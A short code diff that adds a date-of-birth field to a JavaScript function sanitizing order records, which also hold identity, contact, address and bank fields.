@@ -80,7 +80,7 @@ function cleanOrder(b) {
     ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
     card: str(b.card, 10), watch: str(b.watch, 10),
     st: b.st === "resident" ? "resident" : "citizen",
-    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
+    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), dob: str(b.dob || "", 20), p: str(b.p, 15).replace(/\D/g, ""),
     e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
     bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
